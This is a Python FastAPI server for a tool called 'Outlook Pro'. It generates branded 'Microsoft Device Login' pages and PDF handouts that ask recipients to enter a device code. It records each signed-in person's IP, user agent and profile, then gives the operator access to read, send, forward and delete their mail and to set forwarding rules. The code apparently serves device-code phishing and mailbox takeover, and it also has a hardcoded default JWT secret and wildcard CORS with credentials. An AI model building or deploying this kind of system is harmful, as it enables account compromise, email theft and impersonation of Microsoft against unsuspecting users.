from fastapi import FastAPI, Request, Depends, HTTPException
from fastapi.responses import RedirectResponse, JSONResponse, HTMLResponse, StreamingResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from jose import jwt, JWTError
from datetime import datetime, timedelta
from io import BytesIO
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import mm
from reportlab.pdfgen import canvas
import logging
import os
import time

from db import init_db, SessionLocal
from auth import (
    generate_login_link,
    generate_mail_connect_link,
    generate_org_connect_link,
    generate_org_mail_connect_link,
    generate_admin_consent_url,
    exchange_code_for_token,
    get_token,
    start_device_code_flow,
    poll_device_code_flow,
    save_or_update_tenant_consent,
    wrap_worker_url,
    get_user_enterprise_mode,
)
from graph import (
    fetch_emails,
    get_mail_folders,
    get_email_detail,
    reply_to_email,
    send_email,
    forward_email,
    delete_email,
    mark_as_read,
    move_email_to_folder,
)
from models import (
    Rule,
    SavedUser,
    TenantToken,
    TenantConsent,
    TenantConsentStatus,
    RuleAction,
    EnterpriseTenant,
    EnterpriseMode,
)
from admin_auth import login_admin

app = FastAPI()

SECRET_KEY = os.environ.get("SECRET_KEY", "super-secret-key-change-this")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 10080
READ_ONLY_MODE = True
ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")

security = HTTPBearer()
logging.basicConfig(level=logging.DEBUG)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.on_event("startup")
def startup():
    init_db()
    print("✅ Database initialized successfully")


# =========================
# JWT
# =========================

def create_token(data: dict):
    payload = data.copy()
    payload["exp"] = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)


def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        return jwt.decode(credentials.credentials, SECRET_KEY, algorithms=[ALGORITHM])
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid or expired token")


# =========================
# HELPERS
# =========================

def ensure_write_allowed():
    if READ_ONLY_MODE:
        raise HTTPException(status_code=403, detail="Read-only mode enabled")


def get_tenant_hint_from_user_id(user_id: str):
    if not user_id:
        return ""
    if "@" in user_id:
        return user_id.split("@")[-1].lower().strip()
    return user_id.lower().strip()


def get_enterprise_row_by_user_id(user_id: str):
    tenant_hint = get_tenant_hint_from_user_id(user_id)
    if not tenant_hint:
        return None

    db = SessionLocal()
    try:
        return db.query(EnterpriseTenant).filter(
            EnterpriseTenant.tenant_hint == tenant_hint
        ).first()
    finally:
        db.close()


def ensure_enterprise_full(user_id: str):
    mode = get_user_enterprise_mode(user_id)
    if mode != "enterprise_full":
        raise HTTPException(status_code=403, detail="Enterprise full access required")


def split_text_for_pdf(text: str, max_chars: int = 90):
    words = (text or "").split()
    lines = []
    current = ""

    for word in words:
        test = f"{current} {word}".strip()
        if len(test) <= max_chars:
            current = test
        else:
            if current:
                lines.append(current)
            current = word

    if current:
        lines.append(current)

    return lines or [""]


# =========================
# DEVICE HANDOUT BUILDERS
# =========================

def build_device_handout_html(
    title: str,
    brief_writeup: str,
    verification_uri: str,
    user_code: str,
    logo_url: str = "",
):
    safe_title = title or "Microsoft Device Login"
    safe_writeup = brief_writeup or "Please follow the steps below to continue sign-in."
    safe_logo = logo_url or ""
    safe_verification_uri = verification_uri or "https://microsoft.com/devicelogin"
    safe_user_code = user_code or "N/A"

    logo_html = ""
    if safe_logo.strip():
        logo_html = f'''
        <div style="margin-bottom: 20px;">
            <img src="{safe_logo}" alt="Logo" style="max-height: 70px; max-width: 220px;" />
        </div>
        '''
    else:
        logo_html = '''
        <div style="margin-bottom: 20px; padding: 16px; border: 2px dashed #bbb; border-radius: 8px; color: #666;">
            Logo goes here
        </div>
        '''

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1"/>
        <title>{safe_title}</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background: #f5f7fb;
                margin: 0;
                padding: 30px 16px;
                color: #1f2937;
            }}
            .card {{
                max-width: 760px;
                margin: 0 auto;
                background: #ffffff;
                border-radius: 12px;
                padding: 32px;
                box-shadow: 0 8px 24px rgba(0,0,0,0.08);
                border: 1px solid #e5e7eb;
            }}
            .badge {{
                display: inline-block;
                background: #eef6ff;
                color: #0b63c7;
                border: 1px solid #b9d7ff;
                border-radius: 999px;
                padding: 6px 12px;
                font-size: 12px;
                font-weight: bold;
                margin-bottom: 18px;
            }}
            .title {{
                font-size: 30px;
                font-weight: bold;
                margin-bottom: 12px;
            }}
            .writeup {{
                font-size: 16px;
                line-height: 1.6;
                margin-bottom: 24px;
                color: #374151;
            }}
            .section {{
                margin-bottom: 24px;
                padding: 18px;
                border: 1px solid #e5e7eb;
                border-radius: 10px;
                background: #fafafa;
            }}
            .label {{
                font-size: 13px;
                color: #6b7280;
                margin-bottom: 8px;
            }}
            .code {{
                font-size: 34px;
                font-weight: 800;
                letter-spacing: 3px;
                color: #0b63c7;
            }}
            .steps {{
                padding-left: 20px;
                margin-bottom: 18px;
            }}
            .steps li {{
                margin-bottom: 10px;
                line-height: 1.6;
            }}
            .continue-btn {{
                display: inline-block;
                background: #0b63c7;
                color: white !important;
                text-decoration: none;
                padding: 12px 22px;
                border-radius: 8px;
                font-weight: bold;
                font-size: 16px;
                margin-top: 12px;
            }}
            .footer {{
                margin-top: 28px;
                font-size: 12px;
                color: #6b7280;
            }}
        </style>
    </head>
    <body>
        <div class="card">
            {logo_html}
            <div class="badge">Microsoft Device Login</div>
            <div class="title">{safe_title}</div>
            <div class="writeup">{safe_writeup}</div>

            <div class="section">
                <div class="label">Instructions</div>
                <ol class="steps">
                    <li>Click the button below to open sign-in window</li>
                    <li>Enter code "<strong>{safe_user_code}</strong>" when prompted</li>
                    <li>Authenticate with your account</li>
                    <li>Return to this tab to continue.</li>
                </ol>

                <a class="continue-btn" href="{safe_verification_uri}" target="_blank" rel="noopener noreferrer">
                    Continue
                </a>
            </div>

            <div class="section">
                <div class="label">Your code</div>
                <div class="code">{safe_user_code}</div>
            </div>

            <div class="footer">
                Generated by Outlook Pro.
            </div>
        </div>
    </body>
    </html>
    """


def build_device_handout_pdf(
    title: str,
    brief_writeup: str,
    verification_uri: str,
    user_code: str,
    logo_url: str = "",
):
    buffer = BytesIO()
    pdf = canvas.Canvas(buffer, pagesize=A4)
    width, height = A4

    x = 20 * mm
    y = height - 25 * mm

    pdf.setFont("Helvetica-Bold", 22)
    pdf.drawString(x, y, title or "Microsoft Device Login")
    y -= 12 * mm

    pdf.setFont("Helvetica", 11)
    pdf.drawString(x, y, "Logo area:")
    y -= 6 * mm

    if logo_url and logo_url.strip():
        pdf.setFont("Helvetica-Oblique", 10)
        pdf.drawString(x, y, f"Logo URL: {logo_url}")
        y -= 10 * mm
    else:
        pdf.rect(x, y - 20 * mm, 60 * mm, 20 * mm)
        pdf.setFont("Helvetica", 10)
        pdf.drawString(x + 5 * mm, y - 10 * mm, "Logo goes here")
        y -= 28 * mm

    pdf.setFont("Helvetica-Bold", 13)
    pdf.drawString(x, y, "Brief write-up")
    y -= 7 * mm

    writeup = brief_writeup or "Please follow the steps below to continue sign-in."
    pdf.setFont("Helvetica", 11)
    for line in split_text_for_pdf(writeup, 90):
        pdf.drawString(x, y, line)
        y -= 6 * mm

    y -= 4 * mm
    pdf.setFont("Helvetica-Bold", 13)
    pdf.drawString(x, y, "Instructions")
    y -= 8 * mm

    instructions = [
        "1. Click the button below to open sign-in window.",
        f'2. Enter code "{user_code or "N/A"}" when prompted.',
        "3. Authenticate with your account.",
        "4. Return to this tab to continue.",
    ]

    pdf.setFont("Helvetica", 11)
    for line in instructions:
        pdf.drawString(x, y, line)
        y -= 7 * mm

    y -= 4 * mm
    pdf.setFont("Helvetica-Bold", 13)
    pdf.drawString(x, y, "Microsoft link")
    y -= 7 * mm

    pdf.setFont("Helvetica", 11)
    for line in split_text_for_pdf(verification_uri or "https://microsoft.com/devicelogin", 90):
        pdf.drawString(x, y, line)
        y -= 6 * mm

    y -= 4 * mm
    pdf.setFont("Helvetica-Bold", 13)
    pdf.drawString(x, y, "Device code")
    y -= 10 * mm

    pdf.setFont("Helvetica-Bold", 24)
    pdf.drawString(x, y, user_code or "N/A")
    y -= 16 * mm

    pdf.setFont("Helvetica-Oblique", 10)
    pdf.drawString(x, y, "Generated by Outlook Pro.")

    pdf.showPage()
    pdf.save()
    buffer.seek(0)
    return buffer


# =========================
# APP CONFIG
# =========================

@app.get("/app-config")
def app_config():
    return {
        "read_only_mode": READ_ONLY_MODE,
        "device_code_preferred": True,
        "admin_consent_tenant": ADMIN_CONSENT_TENANT,
    }


# =========================
# ADMIN LOGIN
# =========================

@app.post("/admin/login")
async def admin_login(request: Request):
    body = await request.json()
    result = login_admin(body.get("username"), body.get("password"))

    if not result or "error" in result:
        raise HTTPException(status_code=401, detail=(result or {}).get("error", "Invalid login"))

    token = create_token({"sub": body["username"]})
    return {"access_token": token, "token_type": "bearer"}


# =========================
# DASHBOARD SUMMARY
# =========================

@app.get("/dashboard/summary")
def dashboard_summary(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        saved_user_rows = (
            db.query(SavedUser.user_id)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .distinct()
            .all()
        )
        saved_users = [row[0] for row in saved_user_rows if row[0]]

        connected_mailbox_rows = db.query(TenantToken.tenant_id).distinct().all()
        connected_mailboxes = [row[0] for row in connected_mailbox_rows if row[0]]

        tenant_rows = (
            db.query(TenantConsent)
            .filter(TenantConsent.admin_user_id == admin_user_id)
            .all()
        )

        enterprise_rows = (
            db.query(EnterpriseTenant)
            .filter(EnterpriseTenant.admin_user_id == admin_user_id)
            .all()
        )

        approved_tenants = sum(
            1 for row in tenant_rows
            if (row.status.value if hasattr(row.status, "value") else str(row.status)).lower() == "approved"
        )
        pending_tenants = sum(
            1 for row in tenant_rows
            if (row.status.value if hasattr(row.status, "value") else str(row.status)).lower() == "pending"
        )

        enterprise_enabled = sum(
            1 for row in enterprise_rows
            if (row.consent_status.value if hasattr(row.consent_status, "value") else str(row.consent_status)).lower() == "approved"
            and (row.mode.value if hasattr(row.mode, "value") else str(row.mode)).lower() == "enterprise_full"
        )

        return {
            "saved_users_count": len(saved_users),
            "connected_mailboxes_count": len(connected_mailboxes),
            "approved_tenants_count": approved_tenants,
            "pending_tenants_count": pending_tenants,
            "enterprise_enabled_count": enterprise_enabled,
        }
    finally:
        db.close()


# =========================
# DEVICE FLOW
# =========================

@app.post("/device-code/start")
async def device_start(request: Request, user=Depends(verify_token)):
    body = {}
    if request.headers.get("content-type", "").startswith("application/json"):
        body = await request.json()

    mail_mode = bool(body.get("mail_mode", False))
    user_id = (body.get("user_id") or "").strip() or None

    return start_device_code_flow(mail_mode=mail_mode, user_id=user_id)


@app.post("/device-code/poll")
async def device_poll(request: Request, user=Depends(verify_token)):
    body = await request.json()

    result = poll_device_code_flow(
        device_code=body.get("device_code"),
        admin_user_id=user["sub"],
        client_ip=request.client.host if request.client else None,
        user_agent=request.headers.get("user-agent")
    )

    status_value = (result.get("status") or "").lower()
    detail_value = (result.get("detail") or result.get("error") or "").lower()

    admin_block_detected = (
        "admin consent" in detail_value
        or "need admin approval" in detail_value
        or "needs approval" in detail_value
        or ("organization" in detail_value and "approval" in detail_value)
        or ("consent" in detail_value and "admin" in detail_value)
        or "aadsts90094" in detail_value
        or "aadsts65001" in detail_value
        or "aadsts65004" in detail_value
    )

    if admin_block_detected:
        return JSONResponse(
            status_code=403,
            content={
                "status": "admin_consent_required",
                "detail": result.get("detail") or result.get("error") or "This organization requires admin approval before users can connect.",
                "admin_consent_required": True,
            },
        )

    if status_value == "pending":
        return {
            "status": "pending",
            "detail": result.get("detail", "Authorization still pending."),
        }

    if status_value == "expired":
        return JSONResponse(
            status_code=400,
            content={
                "status": "expired",
                "detail": result.get("detail", "Device code expired."),
            },
        )

    if status_value == "declined":
        return JSONResponse(
            status_code=403,
            content={
                "status": "declined",
                "detail": result.get("detail", "Authorization declined."),
            },
        )

    if status_value == "complete":
        return {
            "status": "complete",
            "resolved_user_id": result.get("resolved_user_id"),
            "job_title": result.get("job_title"),
            "profile": result.get("profile"),
            "admin_consent_required": False,
        }

    return JSONResponse(
        status_code=400,
        content={
            "status": result.get("status", "error"),
            "detail": result.get("detail") or result.get("error") or "Device code flow failed.",
        },
    )


# =========================
# DEVICE HANDOUTS
# =========================

@app.get("/device-code/handout/html")
def device_handout_html(
    user_code: str,
    verification_uri: str,
    title: str = "Microsoft Device Login",
    brief_writeup: str = "",
    logo_url: str = "",
    download: int = 0,
    user=Depends(verify_token)
):
    html = build_device_handout_html(
        title=title,
        brief_writeup=brief_writeup,
        verification_uri=verification_uri,
        user_code=user_code,
        logo_url=logo_url
    )

    headers = {}
    headers["Content-Disposition"] = (
        'attachment; filename="device-login-handout.html"'
        if download == 1
        else 'inline; filename="device-login-handout.html"'
    )

    return HTMLResponse(content=html, headers=headers)


@app.get("/device-code/handout/pdf")
def device_handout_pdf(
    user_code: str,
    verification_uri: str,
    title: str = "Microsoft Device Login",
    brief_writeup: str = "",
    logo_url: str = "",
    download: int = 0,
    user=Depends(verify_token)
):
    pdf_buffer = build_device_handout_pdf(
        title=title,
        brief_writeup=brief_writeup,
        verification_uri=verification_uri,
        user_code=user_code,
        logo_url=logo_url
    )

    disposition = "attachment" if download == 1 else "inline"

    return StreamingResponse(
        pdf_buffer,
        media_type="application/pdf",
        headers={
            "Content-Disposition": f'{disposition}; filename="device-login-handout.pdf"'
        }
    )


@app.get("/device")
def serve_worker_device_page(
    user_code: str,
    verification_uri: str,
    title: str = "Microsoft Device Login",
    brief_writeup: str = "",
    logo_url: str = ""
):
    html = build_device_handout_html(
        title=title,
        brief_writeup=brief_writeup,
        verification_uri=verification_uri,
        user_code=user_code,
        logo_url=logo_url
    )
    return HTMLResponse(content=html)


@app.get("/device-code/support-page-link")
def device_support_page_link(
    user_code: str,
    verification_uri: str,
    title: str = "Microsoft Device Login",
    brief_writeup: str = "",
    logo_url: str = "",
    user=Depends(verify_token)
):
    params = {
        "user_code": user_code,
        "verification_uri": verification_uri,
        "title": title,
        "brief_writeup": brief_writeup,
        "logo_url": logo_url,
    }
    support_url = wrap_worker_url("device", params)
    return {"support_page_url": support_url}


# =========================
# LOGIN URLS
# =========================

@app.get("/generate-login-url")
def login_url(user_id: str, user=Depends(verify_token)):
    return {"login_url": generate_login_link(user_id), "flow_type": "basic"}


@app.get("/generate-mail-connect-url")
def mail_connect_url(user_id: str, user=Depends(verify_token)):
    mode = get_user_enterprise_mode(user_id)
    return {
        "login_url": generate_mail_connect_link(user_id),
        "flow_type": "mail",
        "mode": mode,
    }


@app.get("/generate-org-connect-url")
def org_connect(tenant_hint: str | None = None, user=Depends(verify_token)):
    return {"login_url": generate_org_connect_link(user["sub"]), "flow_type": "basic"}


@app.get("/generate-org-mail-connect-url")
def org_mail_connect(tenant_hint: str | None = None, user=Depends(verify_token)):
    return {"login_url": generate_org_mail_connect_link(user["sub"]), "flow_type": "mail"}


@app.get("/generate-admin-consent-url")
def admin_consent(tenant: str | None = None, user=Depends(verify_token)):
    return {"admin_consent_url": generate_admin_consent_url(tenant)}


# =========================
# TENANT CONSENT
# =========================

@app.post("/tenant-consent/generate")
async def generate_tenant_consent(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint is required")

    consent_url = generate_admin_consent_url(tenant_hint)

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        admin_consent_url=consent_url,
        status=TenantConsentStatus.PENDING
    )

    return {
        "tenant_hint": tenant_hint,
        "admin_consent_url": consent_url,
        "status": "pending"
    }


@app.get("/tenant-consents")
def list_tenant_consents(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        rows = (
            db.query(TenantConsent)
            .filter(TenantConsent.admin_user_id == user["sub"])
            .order_by(TenantConsent.updated_at.desc())
            .all()
        )

        return {
            "tenants": [
                {
                    "tenant_hint": r.tenant_hint,
                    "status": r.status.value if hasattr(r.status, "value") else str(r.status),
                    "admin_consent_url": r.admin_consent_url,
                    "notes": r.notes,
                    "created_at": r.created_at,
                    "updated_at": r.updated_at,
                }
                for r in rows
            ]
        }
    finally:
        db.close()


@app.post("/tenant-consent/approve")
async def manually_approve_tenant(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint required")

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        status=TenantConsentStatus.APPROVED,
        notes="Manually approved"
    )

    return {"status": "approved", "tenant_hint": tenant_hint}


# =========================
# ENTERPRISE TENANTS
# =========================

@app.post("/enterprise/onboard")
async def enterprise_onboard(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip().lower()
    mode_raw = (body.get("mode") or "enterprise_full").strip().lower()
    organization_name = (body.get("organization_name") or "").strip() or None
    notes = (body.get("notes") or "").strip() or None

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint is required")

    if mode_raw not in {"preview", "enterprise_full", "app_only"}:
        raise HTTPException(status_code=400, detail="invalid mode")

    consent_url = generate_admin_consent_url(tenant_hint)
    now_ts = int(time.time())

    db = SessionLocal()
    try:
        row = (
            db.query(EnterpriseTenant)
            .filter(
                EnterpriseTenant.admin_user_id == user["sub"],
                EnterpriseTenant.tenant_hint == tenant_hint,
            )
            .first()
        )

        if not row:
            row = EnterpriseTenant(
                admin_user_id=user["sub"],
                tenant_hint=tenant_hint,
                organization_name=organization_name,
                mode=EnterpriseMode(mode_raw),
                consent_status=TenantConsentStatus.PENDING,
                admin_consent_url=consent_url,
                notes=notes,
                created_at=now_ts,
                updated_at=now_ts,
            )
            db.add(row)
        else:
            row.organization_name = organization_name or row.organization_name
            row.mode = EnterpriseMode(mode_raw)
            row.consent_status = TenantConsentStatus.PENDING
            row.admin_consent_url = consent_url
            row.notes = notes
            row.updated_at = now_ts

        db.commit()

        return {
            "tenant_hint": tenant_hint,
            "mode": mode_raw,
            "consent_status": "pending",
            "admin_consent_url": consent_url,
        }
    finally:
        db.close()


@app.get("/enterprise/tenants")
def enterprise_tenants(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        rows = (
            db.query(EnterpriseTenant)
            .filter(EnterpriseTenant.admin_user_id == user["sub"])
            .order_by(EnterpriseTenant.updated_at.desc())
            .all()
        )

        return {
            "tenants": [
                {
                    "tenant_hint": r.tenant_hint,
                    "tenant_id": r.tenant_id,
                    "organization_name": r.organization_name,
                    "mode": r.mode.value if hasattr(r.mode, "value") else str(r.mode),
                    "consent_status": r.consent_status.value if hasattr(r.consent_status, "value") else str(r.consent_status),
                    "admin_consent_url": r.admin_consent_url,
                    "app_only_enabled": r.app_only_enabled,
                    "mailbox_scope_group": r.mailbox_scope_group,
                    "notes": r.notes,
                    "created_at": r.created_at,
                    "updated_at": r.updated_at,
                }
                for r in rows
            ]
        }
    finally:
        db.close()


@app.post("/enterprise/approve")
async def approve_enterprise_tenant(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip().lower()
    mode_raw = (body.get("mode") or "enterprise_full").strip().lower()
    tenant_id = (body.get("tenant_id") or "").strip() or None
    organization_name = (body.get("organization_name") or "").strip() or None
    notes = (body.get("notes") or "").strip() or "Manually approved"

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint is required")

    if mode_raw not in {"preview", "enterprise_full", "app_only"}:
        raise HTTPException(status_code=400, detail="invalid mode")

    db = SessionLocal()
    try:
        row = (
            db.query(EnterpriseTenant)
            .filter(
                EnterpriseTenant.admin_user_id == user["sub"],
                EnterpriseTenant.tenant_hint == tenant_hint,
            )
            .first()
        )

        if not row:
            raise HTTPException(status_code=404, detail="enterprise tenant not found")

        row.mode = EnterpriseMode(mode_raw)
        row.consent_status = TenantConsentStatus.APPROVED
        row.tenant_id = tenant_id or row.tenant_id
        row.organization_name = organization_name or row.organization_name
        row.notes = notes
        row.updated_at = int(time.time())
        db.commit()

        return {
            "tenant_hint": tenant_hint,
            "mode": mode_raw,
            "consent_status": "approved",
        }
    finally:
        db.close()


@app.get("/enterprise/status")
def enterprise_status(user_id: str, user=Depends(verify_token)):
    tenant_hint = get_tenant_hint_from_user_id(user_id)

    if not tenant_hint:
        return {
            "tenant_hint": "",
            "mode": "preview",
            "consent_status": "none",
            "enterprise_enabled": False,
            "app_only_enabled": False,
        }

    db = SessionLocal()
    try:
        row = db.query(EnterpriseTenant).filter(
            EnterpriseTenant.tenant_hint == tenant_hint
        ).first()

        if not row:
            return {
                "tenant_hint": tenant_hint,
                "mode": "preview",
                "consent_status": "none",
                "enterprise_enabled": False,
                "app_only_enabled": False,
            }

        mode_value = row.mode.value if hasattr(row.mode, "value") else str(row.mode)
        consent_value = row.consent_status.value if hasattr(row.consent_status, "value") else str(row.consent_status)

        return {
            "tenant_hint": row.tenant_hint,
            "tenant_id": row.tenant_id,
            "organization_name": row.organization_name,
            "mode": mode_value,
            "consent_status": consent_value,
            "enterprise_enabled": consent_value.lower() == "approved" and mode_value.lower() == "enterprise_full",
            "app_only_enabled": bool(row.app_only_enabled),
            "mailbox_scope_group": row.mailbox_scope_group,
            "notes": row.notes,
        }
    finally:
        db.close()


# =========================
# AUTH CALLBACK
# =========================

@app.get("/auth/callback")
def callback(request: Request):
    code = request.query_params.get("code")
    state = request.query_params.get("state")

    if not code:
        return {"error": "No code"}

    exchange_code_for_token(
        code,
        state,
        request.client.host if request.client else None,
        request.headers.get("user-agent")
    )

    return RedirectResponse("https://www.microsoft.com")


# =========================
# MICROSOFT STATUS
# =========================

@app.get("/microsoft/status")
def microsoft_status(user_id: str, user=Depends(verify_token)):
    token = get_token(user_id)

    connected = False
    has_refresh_token = False
    expires_at = None
    inbox_connected = False

    if token:
        has_refresh_token = bool(token.refresh_token)
        expires_at = token.expires_at
        connected = bool(token.access_token)

        try:
            _ = get_mail_folders(user_id)
            inbox_connected = True
        except Exception:
            inbox_connected = False

    enterprise_mode = get_user_enterprise_mode(user_id)

    return {
        "user_id": user_id,
        "connected": connected,
        "inbox_connected": inbox_connected,
        "has_refresh_token": has_refresh_token,
        "expires_at": expires_at,
        "enterprise_mode": enterprise_mode,
        "enterprise_full": enterprise_mode == "enterprise_full",
    }


# =========================
# USERS
# =========================

@app.get("/users")
def users(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        connected = [t.tenant_id for t in db.query(TenantToken).all() if t.tenant_id]
        saved = [s.user_id for s in db.query(SavedUser).filter_by(admin_user_id=admin_user_id).all() if s.user_id]
        return {"users": sorted(list(set(connected + saved)))}
    finally:
        db.close()


@app.post("/saved-users")
async def save_user(request: Request, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        body = await request.json()
        target_user_id = (body.get("user_id") or "").strip()

        if not target_user_id:
            return JSONResponse({"error": "user_id is required"}, status_code=400)

        existing = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == user["sub"],
                SavedUser.user_id == target_user_id
            )
            .first()
        )

        if existing:
            return {"message": "User already saved", "user_id": target_user_id}

        row = SavedUser(
            admin_user_id=user["sub"],
            user_id=target_user_id
        )
        db.add(row)
        db.commit()

        return {"message": "saved", "user_id": target_user_id}
    finally:
        db.close()


@app.delete("/saved-users")
def delete_user(user_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        row = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == user["sub"],
                SavedUser.user_id == user_id
            )
            .first()
        )

        if row:
            db.delete(row)
            db.commit()

        return {"message": "deleted", "user_id": user_id}
    finally:
        db.close()


# =========================
# EMAIL ROUTES
# =========================

@app.get("/emails")
def emails(user_id: str, folder_id: str = None, user=Depends(verify_token)):
    try:
        return {"emails": fetch_emails(user_id, folder_id)}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/folders")
def folders(user_id: str, user=Depends(verify_token)):
    try:
        return {"folders": get_mail_folders(user_id)}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/email/{id}")
def email(id: str, user_id: str, user=Depends(verify_token)):
    try:
        return get_email_detail(user_id, id)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/email/delete")
async def delete(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    ensure_enterprise_full(body["user_id"])
    return delete_email(body["user_id"], body["message_id"])


@app.post("/email/mark-read")
async def mark(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    ensure_enterprise_full(body["user_id"])
    return mark_as_read(body["user_id"], body["message_id"])


@app.post("/email/move")
async def move(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    ensure_enterprise_full(body["user_id"])
    return move_email_to_folder(body["user_id"], body["message_id"], body["folder_id"])


@app.post("/email/reply")
async def reply(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    ensure_enterprise_full(body["user_id"])
    return reply_to_email(body["user_id"], body["message_id"], body["reply_text"])


@app.post("/email/send")
async def send(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    ensure_enterprise_full(body["user_id"])
    return send_email(body["user_id"], body["to"], body["subject"], body["body"])


@app.post("/email/forward")
async def forward(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    ensure_enterprise_full(body["user_id"])
    return forward_email(body["user_id"], body["message_id"], body["to"])


# =========================
# RULES
# =========================

@app.post("/rules")
async def create_rule(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()

    db = SessionLocal()
    try:
        body = await request.json()

        if not body.get("condition"):
            return JSONResponse({"error": "condition is required"}, status_code=400)
        if not body.get("keyword"):
            return JSONResponse({"error": "keyword is required"}, status_code=400)
        if not body.get("action"):
            return JSONResponse({"error": "action is required"}, status_code=400)

        ensure_enterprise_full(body["user_id"])

        rule = Rule(
            user_id=body["user_id"],
            condition=body["condition"],
            keyword=body["keyword"],
            action=RuleAction(body["action"]),
            target_folder=body.get("target_folder"),
            forward_to=body.get("forward_to"),
            is_active=body.get("is_active", True),
            created_at=int(time.time()),
        )

        db.add(rule)
        db.commit()
        return {"message": "created"}
    finally:
        db.close()


@app.get("/rules")
def get_rules(user_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        rules = db.query(Rule).filter_by(user_id=user_id).all()

        return {
            "rules": [
                {
                    "id": r.id,
                    "user_id": r.user_id,
                    "condition": r.condition,
                    "keyword": r.keyword,
                    "action": r.action.value if hasattr(r.action, "value") else str(r.action),
                    "target_folder": r.target_folder,
                    "forward_to": r.forward_to,
                    "is_active": r.is_active,
                    "created_at": r.created_at,
                }
                for r in rules
            ]
        }
    finally:
        db.close()